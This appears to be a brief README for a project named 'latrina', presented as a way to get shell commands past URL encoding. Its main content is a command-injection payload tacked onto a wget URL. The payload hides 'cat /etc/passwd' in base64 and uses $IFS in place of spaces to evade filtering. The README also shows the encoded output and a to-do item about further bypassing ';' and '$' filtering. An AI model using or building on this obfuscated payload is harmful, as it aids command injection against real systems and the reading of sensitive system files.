# latrina
bypass url encoding with nontrivial commands

```
wget https://github.com/kusky3/latrina/raw/main/;a=('Y2F0IC9ldGMvcGFzc3dkCg==');b=('base');c=$IFS;d=64;$($b$d$c-d$c<<<$a)
```

current output
```
https://github.com/kusky3/latrina/blob/main/%3Ba%3D('Y2F0IC9ldGMvcGFzc3dkCg%3D%3D')%3Bb%3D('base')%3Bc%3D%24IFS%3Bd%3D64%3B%24(%24b%24d%24c-d%24c%3C%3C%3C%24a)
```

# TODO
bypass ; and $
